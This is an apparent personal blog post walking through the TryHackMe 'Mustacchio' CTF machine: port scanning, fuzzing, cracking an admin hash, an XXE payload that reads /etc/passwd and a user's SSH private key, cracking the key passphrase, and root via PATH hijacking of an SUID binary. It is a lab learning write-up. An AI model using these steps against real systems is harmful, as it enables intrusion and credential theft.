<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Mustacchio Walkthrough | Try Hack Me | Ally¬†Petitt | Ally Petitt</title>
<meta name=keywords content="TryHackMe,XXE,CTF,Tutorial"><meta name=description content="Introduction Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!
Notes:¬†This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows Enumeration To begin, I scanned for open ports using RustScan. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer."><meta name=author content="Ally Petitt"><link rel=canonical href=https://ally-petitt.github.io:443/en/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://ally-petitt.github.io:443/assets/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ally-petitt.github.io:443/assets/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ally-petitt.github.io:443/assets/favicon-32x32.png><link rel=apple-touch-icon href=https://ally-petitt.github.io:443/assets/apple-touch-icon.png><link rel=mask-icon href=https://ally-petitt.github.io:443/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://ally-petitt.github.io:443/en/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="Mustacchio Walkthrough | Try Hack Me | Ally¬†Petitt"><meta property="og:description" content="Introduction Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!
Notes:¬†This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows Enumeration To begin, I scanned for open ports using RustScan. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer."><meta property="og:type" content="article"><meta property="og:url" content="https://ally-petitt.github.io:443/en/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-02-18T00:00:00+00:00"><meta property="article:modified_time" content="2022-02-18T00:00:00+00:00"><meta property="og:site_name" content="Ally Petitt"><meta name=twitter:card content="summary"><meta name=twitter:title content="Mustacchio Walkthrough | Try Hack Me | Ally¬†Petitt"><meta name=twitter:description content="Introduction Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!
Notes:¬†This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows Enumeration To begin, I scanned for open ports using RustScan. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ally-petitt.github.io:443/en/posts/"},{"@type":"ListItem","position":2,"name":"Mustacchio Walkthrough | Try Hack Me | Ally¬†Petitt","item":"https://ally-petitt.github.io:443/en/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Mustacchio Walkthrough | Try Hack Me | Ally¬†Petitt","name":"Mustacchio Walkthrough | Try Hack Me | Ally¬†Petitt","description":"Introduction Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!\nNotes:¬†This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows Enumeration To begin, I scanned for open ports using RustScan. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer.","keywords":["TryHackMe","XXE","CTF","Tutorial"],"articleBody":" Introduction Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!\nNotes:¬†This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows Enumeration To begin, I scanned for open ports using RustScan. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer. My results were as follows:\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry¬†|_/ | http-methods:¬†|_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Mustacchio | Home 8765/tcp open http syn-ack nginx 1.10.3 (Ubuntu) |_http-server-header: nginx/1.10.3 (Ubuntu) |_http-title: Mustacchio | Login | http-methods:¬†|_ Supported Methods: GET HEAD POST Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nAs shown by this scan, there are 3 ports open. I investigated the website on port 80 first. I looked through the source code, checked for cookies, looked for linked javascript files, and tested the contact form for cross-site scripting. I found nothing interesting, so I continued to do directory enumeration using FFUF (you can also use Wfuzz, Gobuster, or DirBuster for this part).\nffuf -u -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\nThe custom directory looks interesting. I noticed it earlier when I was looking at the linked JavaScript files. Let‚Äôs investigate.\nAnd we have access to these files! I went inside the JavaScript file and found a file called users.bak. I downloaded the file and ran the strings command on it.\n$ strings users.bak¬†SQLite format 3 tableusersusers CREATE TABLE users(username text NOT NULL, password text NOT NULL) ]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b\nFrom this file, we have learned that they are using SQLite 3 to store their users. Now, we have a way to view the admin user in their database. Great! Before we go deeper into this, I‚Äôd like to explore the other web server running on port 8765.\nHow great is this! We found the admin panel where we can log in as admin. Let‚Äôs see if we can get the admin credentials using the users.bak file.\nExploitation After a few Google searches, I found out how to open this file. I used the SQLite3 CLI:\n$ sqlite3 users.bak SQLite version 3.36.0 2021‚Äì06‚Äì18 18:36:39 Enter ‚Äú.help‚Äù for usage hints. sqlite\u003e¬†.tables users sqlite\u003e¬†.dump users PRAGMA foreign_keys=OFF; BEGIN TRANSACTION; CREATE TABLE users(username text NOT NULL, password text NOT NULL); INSERT INTO users VALUES(‚Äòadmin‚Äô,‚Äô1868e36a6d2b17d4c2745f1659433a54d4bc5f4b‚Äô); COMMIT;\nAnd there is the password hash that we found when we initially used the strings command on users.bak üòÇ. I tried to use my best buddy John for help, but he failed me today. Instead, I resorted to hashcat to crack the password.\n$ hashcat -m 100¬†./hash /usr/share/wordlists/rockyou.txt\nAnd we have our password! With the newfound credentials admin:bulldog19 I logged into the admin console on port 8765. Success! The credentials worked.\nWhile looking at the page source, two things immediately stand out to me.\nI see a comment left by the developer The name of the input box is ‚Äúxml‚Äù When I try press submit without writing anything in the textarea, I am greeted by the following alert:\nInteresting. Maybe we can submit our own XML code to perform a reverse shell. One of the most common XML vulnerabilities is an XML Eternal Entity (XXE) injection, so let‚Äôs test for it in this application! I used the XXE payload from this blog post:\n`\u003c?xml version=‚Äù1.0\" encoding=‚ÄùUTF-8\"?\u003e\n\u003c!DOCTYPE comment [\u003c!ENTITY xee SYSTEM ‚Äú/etc/passwd‚Äù\u003e ]\u003e \u0026xee; ` When I type this in the text area and press ‚ÄúSubmit‚Äù, I see the following on my screen:\nSuccess! This application is vulnerable to XXE injection. Let‚Äôs use this vulnerability to get our first flag.\nUser.txt Here, we can see Barry as a user on this machine. Recalling that we found a comment regarding his SSH key in the source code, maybe we can find his private key to gain SSH access to this server. To do this, I looked inside his¬†.ssh folder inside his home directory. I simply changed /etc/passwd to /home/barry/.ssh/id_rsa as ‚Äúid_rsa‚Äù is a common name for the file containing a private ssh key.\nSuccess! We can now see Barry‚Äôs private SSH key. If we were to directly copy-paste this from the webpage we would have formatting issues. Instead, I inspected the page and copied the key from the HTML. I then pasted it into a file called ‚Äúid_rsa_barry‚Äù, making sure that there is no white space. I changed the permissions on the file using this command:\nchmod 400 id_rsa_barry\nI went to ssh into the machine and this was my result:\nIt seems that we need a passphrase. The passphrase should be within the private SSH key file, which we can crack using John.\n$ python3 /usr/share/john/ssh2john.py id_rsa_barry \u003e id_rsa_barry.hash $ john‚Ää‚Äî‚Ääwordlist=/usr/share/wordlists/rockyou.txt id_rsa_barry.hash\nGreat! Now we have the passphrase to use. I used the same ssh command from before to log in and entered the passphrase that I just found. And we are in.\nPrivilege Escalation First, I took a look at Barry‚Äôs id.\nbarry@mustacchio:~$ id uid=1003(barry) gid=1003(barry) groups=1003(barry)\nIt appears that he is not in any groups that we could use for privilege escalation. I also used sudo -l to see if there are any commands that we can run as root without a password. This turned out not to be the case. Then, I checked for any SUID binaries. These are files that can run with root privileges.\nbarry@mustacchio:~$ find / -perm -4000 2\u003e/dev/null /usr/lib/x86\\_64-linux-gnu/lxc/lxc-user-nic /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/snapd/snap-confine /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/bin/passwd /usr/bin/pkexec /usr/bin/chfn /usr/bin/newgrp /usr/bin/at /usr/bin/chsh /usr/bin/newgidmap /usr/bin/sudo /usr/bin/newuidmap /usr/bin/gpasswd **/home/joe/live\\_log** /bin/ping /bin/ping6 /bin/umount /bin/mount /bin/fusermount /bin/su Interesting, ‚Äúlive_log‚Äù is in Joe‚Äôs home directory. Maybe we have permission to execute it.\nbarry@mustacchio:~$ cd /home/joe \u0026\u0026 ls -la total 28 drwxr-xr-x 2 joe joe 4096 Jun 12 2021¬†. drwxr-xr-x 4 root root 4096 Jun 12 2021¬†.. -rwsr-xr-x 1 root root 16832 Jun 12 2021 live_log\nAnd we do! When I run it, it appears to launch an application.\nThis isn‚Äôt very useful to us because we can‚Äôt interact with the application! Instead, I looked further into the file using the strings command. Additionally, I used awk so that we would only see the long strings that are more likely to be helpful. If nothing useful came out, then I would lower the minimum string length from 15 characters to 10 and so on because the output can often be very long.\n$ strings live_log | awk ‚Äòlength($0) \u003e 15‚Äô\nInteresting. There is a path to ‚Äúaccess.log‚Äù and the full path for the tail command isn‚Äôt used. Maybe we can change the PATH variable so that we can use our own ‚Äútail‚Äù command that gives us root.\n`$ export PATH=/tmp\n$ cd /tmp\n$ echo ‚Äú/bin/bash -p‚Äù \u003e tail\n$ /bin/chmod +x tail\n$ /home/joe/live_log\n/usr/bin/whoami root\n/bin/cat /root/root.txt [REDACTED]`\nAnd it works! Since ‚Äúlive_log‚Äù was an SUID binary, we were able to run it as root. We were able to redirect the path from /usr/bin/tail to /tmp/tail which allowed us to run /bin/bash as root, giving us a root shell.\nThat‚Äôs all! I hope you enjoyed my explanations. Please send me any constructive feedback via LinkedIn. Thank you and take care!\n","wordCount":"1224","inLanguage":"en","datePublished":"2022-02-18T00:00:00Z","dateModified":"2022-02-18T00:00:00Z","author":{"@type":"Person","name":"Ally Petitt"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://ally-petitt.github.io:443/en/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/"},"publisher":{"@type":"Organization","name":"Ally Petitt","logo":{"@type":"ImageObject","url":"https://ally-petitt.github.io:443/assets/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ally-petitt.github.io:443/en/ accesskey=h title="Home (Alt + H)">Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ally-petitt.github.io:443/en/archives title=Archive><span>Archive</span></a></li><li><a href=https://ally-petitt.github.io:443/en/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://ally-petitt.github.io:443/en/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://ally-petitt.github.io:443/en/about-me/ title="About Me"><span>About Me</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://ally-petitt.github.io:443/en/>Home</a>&nbsp;¬ª&nbsp;<a href=https://ally-petitt.github.io:443/en/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Mustacchio Walkthrough | Try Hack Me | Ally¬†Petitt</h1><div class=post-meta><span title='2022-02-18 00:00:00 +0000 UTC'>2022-02-18</span>&nbsp;¬∑&nbsp;6 min&nbsp;¬∑&nbsp;Ally Petitt</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#introduction aria-label=Introduction>Introduction</a></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a></li><li><a href=#exploitation aria-label=Exploitation>Exploitation</a></li><li><a href=#usertxt aria-label=User.txt>User.txt</a></li><li><a href=#usrbinwhoami aria-label=/usr/bin/whoami>/usr/bin/whoami</a></li><li><a href=#bincat-rootroottxt aria-label="/bin/cat /root/root.txt">/bin/cat /root/root.txt</a></li></ul></div></details></div><div class=post-content><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*F19asfqgh7o-jFDVwsTizA.png alt></p><h1 id=introduction><strong>Introduction</strong><a hidden class=anchor aria-hidden=true href=#introduction>#</a></h1><p>Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!</p><p>Notes:¬†</p><ul><li>This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows</li></ul><h1 id=enumeration><strong>Enumeration</strong><a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h1><p>To begin, I scanned for open ports using <a href=https://github.com/RustScan/RustScan>RustScan</a>. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer. My results were as follows:</p><p><code>PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry¬† |_/ | http-methods:¬† |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Mustacchio | Home 8765/tcp open http syn-ack nginx 1.10.3 (Ubuntu) |_http-server-header: nginx/1.10.3 (Ubuntu) |_http-title: Mustacchio | Login | http-methods:¬† |_ Supported Methods: GET HEAD POST Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><p>As shown by this scan, there are 3 ports open. I investigated the website on port 80 first. I looked through the source code, checked for cookies, looked for linked javascript files, and tested the contact form for cross-site scripting. I found nothing interesting, so I continued to do directory enumeration using <a href=https://github.com/ffuf/ffuf>FFUF</a> (you can also use Wfuzz, Gobuster, or DirBuster for this part).</p><p><code>ffuf -u &lt;http://10.10.93.193/FUZZ> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*erwnChNmTvF8tXrU6r_S-Q.png alt>
The custom directory looks interesting. I noticed it earlier when I was looking at the linked JavaScript files. Let‚Äôs investigate.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*V_As8mpAktOxs0GjknBnAw.png alt>
And we have access to these files! I went inside the JavaScript file and found a file called users.bak. I downloaded the file and ran the strings command on it.</p><p><code>$ strings users.bak¬† SQLite format 3 tableusersusers CREATE TABLE users(username text NOT NULL, password text NOT NULL) ]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b</code></p><p>From this file, we have learned that they are using SQLite 3 to store their users. Now, we have a way to view the admin user in their database. Great! Before we go deeper into this, I‚Äôd like to explore the other web server running on port 8765.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*tmf5emcwConOrADGYV4Veg.png alt>
How great is this! We found the admin panel where we can log in as admin. Let‚Äôs see if we can get the admin credentials using the users.bak file.</p><h1 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h1><p>After a few Google searches, I found out how to open this file. I used the SQLite3 CLI:</p><p><code>$ sqlite3 users.bak SQLite version 3.36.0 2021‚Äì06‚Äì18 18:36:39 Enter ‚Äú.help‚Äù for usage hints. sqlite>¬†.tables users sqlite>¬†.dump users PRAGMA foreign_keys=OFF; BEGIN TRANSACTION; CREATE TABLE users(username text NOT NULL, password text NOT NULL); INSERT INTO users VALUES(‚Äòadmin‚Äô,‚Äô1868e36a6d2b17d4c2745f1659433a54d4bc5f4b‚Äô); COMMIT;</code></p><p>And there is the password hash that we found when we initially used the strings command on users.bak üòÇ. I tried to use my best buddy John for help, but he failed me today. Instead, I resorted to hashcat to crack the password.</p><p><code>$ hashcat -m 100¬†./hash /usr/share/wordlists/rockyou.txt</code></p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*n3kLAAUq1LNmS2DrlBHwcA.png alt>
And we have our password! With the newfound credentials <code>admin:bulldog19</code> I logged into the admin console on port 8765. Success! The credentials worked.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*0UmbX55dZohkB-gKgPoRBw.png alt>
While looking at the page source, two things immediately stand out to me.</p><ol><li>I see a comment left by the developer</li><li>The name of the input box is ‚Äúxml‚Äù</li></ol><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*0tRlE5e6aAO2JQcOEZREOw.png alt>
When I try press submit without writing anything in the textarea, I am greeted by the following alert:</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*cD5Mov3ZH_r2YjtzfLoX3w.png alt>
Interesting. Maybe we can submit our own XML code to perform a reverse shell. One of the <a href=https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870>most common XML vulnerabilities</a> is an XML Eternal Entity (XXE) injection, so let‚Äôs test for it in this application! I used the XXE payload from this <a href=https://cybarrior.com/blog/2019/11/28/xml-external-entity-xxe-injection-payload-list/>blog post</a>:</p><p>`</p><!doctype html>]>
<comment>¬†<com>&xee;</com>
</comment>`<p>When I type this in the text area and press ‚ÄúSubmit‚Äù, I see the following on my screen:</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*XQySYPmpIgWDqkmlXyx_Ag.png alt>
Success! This application is vulnerable to XXE injection. Let‚Äôs use this vulnerability to get our first flag.</p><h1 id=usertxt>User.txt<a hidden class=anchor aria-hidden=true href=#usertxt>#</a></h1><p>Here, we can see Barry as a user on this machine. Recalling that we found a comment regarding his SSH key in the source code, maybe we can find his private key to gain SSH access to this server. To do this, I looked inside his¬†.ssh folder inside his home directory. I simply changed <code>/etc/passwd</code> to <code>/home/barry/.ssh/id_rsa</code> as &ldquo;id_rsa&rdquo; is a common name for the file containing a private ssh key.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*yEC5KVva_GVYWI45nKBEfg.png alt>
Success! We can now see Barry‚Äôs private SSH key. If we were to directly copy-paste this from the webpage we would have formatting issues. Instead, I inspected the page and copied the key from the HTML. I then pasted it into a file called ‚Äúid_rsa_barry‚Äù, <strong>making sure that there is no white space</strong>. I changed the permissions on the file using this command:</p><p><code>chmod 400 id_rsa_barry</code></p><p>I went to ssh into the machine and this was my result:</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*mGKSvT93JzuxBhgxAvxBIg.png alt>
It seems that we need a passphrase. The passphrase should be within the private SSH key file, which we can crack using John.</p><p><code>$ python3 /usr/share/john/ssh2john.py id_rsa_barry > id_rsa_barry.hash ¬†$ john‚Ää‚Äî‚Ääwordlist=/usr/share/wordlists/rockyou.txt id_rsa_barry.hash</code></p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*DFe8cHaY9rABFQoOAkr-iA.png alt>
Great! Now we have the passphrase to use. I used the same ssh command from before to log in and entered the passphrase that I just found. And we are in.</p><h1 id=privilege-escalation><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*RBrrcp7EVvjb9szz2tLUGg.png alt>
Privilege Escalation</h1><p>First, I took a look at Barry‚Äôs id.</p><p><code>barry@mustacchio:~$ id uid=1003(barry) gid=1003(barry) groups=1003(barry)</code></p><p>It appears that he is not in any groups that we could use for privilege escalation. I also used <code>sudo -l</code> to see if there are any commands that we can run as root without a password. This turned out not to be the case. Then, I checked for any SUID binaries. These are files that can run with root privileges.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>barry@mustacchio:~$ find / -perm -4000 2&gt;/dev/null  
</span></span><span style=display:flex><span>/usr/lib/x86\_64-linux-gnu/lxc/lxc-user-nic  
</span></span><span style=display:flex><span>/usr/lib/eject/dmcrypt-get-device  
</span></span><span style=display:flex><span>/usr/lib/policykit-1/polkit-agent-helper-1  
</span></span><span style=display:flex><span>/usr/lib/snapd/snap-confine  
</span></span><span style=display:flex><span>/usr/lib/openssh/ssh-keysign  
</span></span><span style=display:flex><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
</span></span><span style=display:flex><span>/usr/bin/passwd  
</span></span><span style=display:flex><span>/usr/bin/pkexec  
</span></span><span style=display:flex><span>/usr/bin/chfn  
</span></span><span style=display:flex><span>/usr/bin/newgrp  
</span></span><span style=display:flex><span>/usr/bin/at  
</span></span><span style=display:flex><span>/usr/bin/chsh  
</span></span><span style=display:flex><span>/usr/bin/newgidmap  
</span></span><span style=display:flex><span>/usr/bin/sudo  
</span></span><span style=display:flex><span>/usr/bin/newuidmap  
</span></span><span style=display:flex><span>/usr/bin/gpasswd  
</span></span><span style=display:flex><span>**/home/joe/live\_log**  
</span></span><span style=display:flex><span>/bin/ping  
</span></span><span style=display:flex><span>/bin/ping6  
</span></span><span style=display:flex><span>/bin/umount  
</span></span><span style=display:flex><span>/bin/mount  
</span></span><span style=display:flex><span>/bin/fusermount  
</span></span><span style=display:flex><span>/bin/su
</span></span></code></pre></div><p>Interesting, ‚Äúlive_log‚Äù is in Joe‚Äôs home directory. Maybe we have permission to execute it.</p><p><code>barry@mustacchio:~$ cd /home/joe && ls -la total 28 drwxr-xr-x 2 joe joe 4096 Jun 12 2021¬†. drwxr-xr-x 4 root root 4096 Jun 12 2021¬†.. -rwsr-xr-x 1 root root 16832 Jun 12 2021 live_log</code></p><p>And we do! When I run it, it appears to launch an application.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*4UbZ77EZp3aHOXEHYvNonQ.png alt>
This isn‚Äôt very useful to us because we can‚Äôt interact with the application! Instead, I looked further into the file using the <code>strings</code> command. Additionally, I used <code>awk</code> so that we would only see the long strings that are more likely to be helpful. If nothing useful came out, then I would lower the minimum string length from 15 characters to 10 and so on because the output can often be very long.</p><p><code>$ strings live_log | awk ‚Äòlength($0) > 15‚Äô</code></p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*8nyN1k4x9nZpM1sGpDmSsg.png alt>
Interesting. There is a path to ‚Äúaccess.log‚Äù and the full path for the <code>tail</code> command isn‚Äôt used. Maybe we can change the PATH variable so that we can use our own ‚Äútail‚Äù command that gives us root.</p><p>`$ export PATH=/tmp<br>$ cd /tmp<br>$ echo ‚Äú/bin/bash -p‚Äù > tail<br>$ /bin/chmod +x tail<br>$ /home/joe/live_log</p><h1 id=usrbinwhoami>/usr/bin/whoami<a hidden class=anchor aria-hidden=true href=#usrbinwhoami>#</a></h1><p>root</p><h1 id=bincat-rootroottxt>/bin/cat /root/root.txt<a hidden class=anchor aria-hidden=true href=#bincat-rootroottxt>#</a></h1><p>[REDACTED]`</p><p>And it works! Since ‚Äúlive_log‚Äù was an SUID binary, we were able to run it as root. We were able to redirect the path from <code>/usr/bin/tail</code> to <code>/tmp/tail</code> which allowed us to run <code>/bin/bash</code> as root, giving us a root shell.</p><p>That‚Äôs all! I hope you enjoyed my explanations. Please send me any constructive feedback <a href=https://www.linkedin.com/in/ally-petitt-5a02aa208/>via LinkedIn</a>. Thank you and take care!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://ally-petitt.github.io:443/en/tags/tryhackme/>TryHackMe</a></li><li><a href=https://ally-petitt.github.io:443/en/tags/xxe/>XXE</a></li><li><a href=https://ally-petitt.github.io:443/en/tags/ctf/>CTF</a></li><li><a href=https://ally-petitt.github.io:443/en/tags/tutorial/>Tutorial</a></li></ul><nav class=paginav><a class=prev href=https://ally-petitt.github.io:443/en/posts/2022-05-25_kerberos-authentication-explained-3d45f336bb2c/><span class=title>¬´ Prev</span><br><span>Kerberos Authentication Explained</span>
</a><a class=next href=https://ally-petitt.github.io:443/en/posts/drafts/fixing-rss-link/><span class=title>Next ¬ª</span><br><span></span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Mustacchio Walkthrough | Try Hack Me | Ally¬†Petitt on x" href="https://x.com/intent/tweet/?text=Mustacchio%20Walkthrough%20%7c%20Try%20Hack%20Me%20%7c%20Ally%c2%a0Petitt&amp;url=https%3a%2f%2fally-petitt.github.io%3a443%2fen%2fposts%2f2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b%2f&amp;hashtags=TryHackMe%2cXXE%2cCTF%2cTutorial"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Mustacchio Walkthrough | Try Hack Me | Ally¬†Petitt on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fally-petitt.github.io%3a443%2fen%2fposts%2f2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b%2f&amp;title=Mustacchio%20Walkthrough%20%7c%20Try%20Hack%20Me%20%7c%20Ally%c2%a0Petitt&amp;summary=Mustacchio%20Walkthrough%20%7c%20Try%20Hack%20Me%20%7c%20Ally%c2%a0Petitt&amp;source=https%3a%2f%2fally-petitt.github.io%3a443%2fen%2fposts%2f2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Mustacchio Walkthrough | Try Hack Me | Ally¬†Petitt on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fally-petitt.github.io%3a443%2fen%2fposts%2f2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b%2f&title=Mustacchio%20Walkthrough%20%7c%20Try%20Hack%20Me%20%7c%20Ally%c2%a0Petitt"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 